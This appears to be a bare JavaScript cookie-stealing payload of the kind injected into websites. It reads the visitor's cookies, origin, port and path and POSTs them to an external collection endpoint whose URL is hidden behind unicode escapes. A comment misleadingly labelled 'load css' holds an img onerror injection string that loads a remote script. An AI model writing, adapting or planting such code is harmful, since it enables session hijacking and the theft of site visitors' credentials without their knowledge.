(function() {
    /* load css
     var drc = document.createElement('script');drc.setAttribute("src","https://");document.getElementsByTagName('head')[0].appendChild(drc);
     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://aa/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
    */
    this.meta = document.createElement('meta');
    this.meta.content = "upgrade-insecure-requests";
    this.meta.setAttribute("http-equiv", "Content-Security-Policy");
    document.getElementsByTagName('head')[0].appendChild(this.meta);
    this.fn1 = function(o) {
        this.xhr = new XMLHttpRequest();
        this.xhr.setRequestHeader('Content-Type', 'application/json');
        this.xhr.open('POST', o.url, true);
        this.xhr.send(JSON.stringify(o.data));
    }
    this.dt = {
        c: document.cookie,
        d: window.location.origin,
        p: window.location.port ? window.location.port : window.location.protocol == 'https:' ? 443 : 80,
        t: window.location.pathname
    }
    this.fn1({ url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u006f\u0078\u002e\u006c\u0075\u0063\u006b\u0079\u0032\u0038\u0038\u0038\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0066\u0074\u0074\u0073", data: dt });
    /*var drc = document.createElement('script');drc.setAttribute("src","");document.getElementsByTagName('head')[0].appendChild(drc);
        document.querySelector()  s.parentElement.parentElement.remove();
    */
}(window))